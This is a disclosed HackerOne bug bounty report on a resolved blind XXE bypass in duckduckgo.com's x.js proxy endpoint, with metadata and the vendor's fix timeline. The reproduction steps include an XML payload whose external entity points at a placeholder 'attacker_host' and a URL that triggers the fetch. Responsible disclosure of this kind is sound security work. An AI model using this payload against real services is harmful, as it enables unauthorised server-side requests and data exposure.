---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - cwe/xml-external-entities-xxe
  - env/web
substate: "resolved"
weakness: "XML External Entities (XXE)"
enriched: true
body: true
date: 2019-02-25
submitted: 2019-01-26T19:30:34.188Z
bounty_usd: null
votes: 159
cve: []
program: "[[programs/duckduckgo|DuckDuckGo]]"
reporter: "mik317"
source: "https://hackerone.com/reports/486732"
title: "Partial bypass of #483774 with Blind XXE on https://duckduckgo.com"
---
# Partial bypass of #483774 with Blind XXE on https://duckduckgo.com

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 159 | **Program:** DuckDuckGo | **Disclosed:** 2019-02-25

- Report: [https://hackerone.com/reports/486732](https://hackerone.com/reports/486732)
- CWE: XML External Entities (XXE)
- Submitted: 2019-01-26T19:30:34.188Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

**Summary:**
Hi DuckDuckGo team,
I've contacted previously you because in a second time (on the #483774 report), I've seen that was possible bypass the fix. Anyway, I've not got any response, and because I think that this is a bit dangerous issue, I'm opening another report for the bypass. Hope you'll agree.

**Steps for reproduction:**
1. Attacker creates a public server and hosts a file with the following content:

```xml
<?xml version="1.0" ?>
<!DOCTYPE root [
<!ENTITY % ext SYSTEM "http://attacker_host/Blind_xxe"> %ext;
]>
<r></r>
```
2. User goes on https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml
3. The `http://attacker_host/Blind_xxe` resource will be requested by an host {F413045}

I'd like to say that this affects not only `duckduckgo.com`, but also `api.duckduckgo.com`. Anyway, the #483908 report is still in the `triaged` state, so I think that will not be right against you submit another report also for the `api.duckduckgo.com` domain.

## Impact

Blind XXE leads to `dos` and `blind injection`.

## Timeline

- **Report Filed**
- **2019-01-26** @marcantonio: Thanks @mik317. We are evaluating fixes.
- **2019-01-28** @tim_ddg: @mik317, this should be fixed, can you verify?
- **Report Needs More Info**
- **Report New**
- **Report Resolved**
- **Swag Awarded**
- **2019-01-28** @mik317: Thank you so much,
One of the best team I've worked with, and that doesn't undervalue, the "work" of teen-aged testers;)

Cheers, Mik
- **Agreed On Going Public**
- **Agreed On Going Public**
- **Report Became Public**
- **2019-02-25** @mik317: Thank you :),

Best, Mik
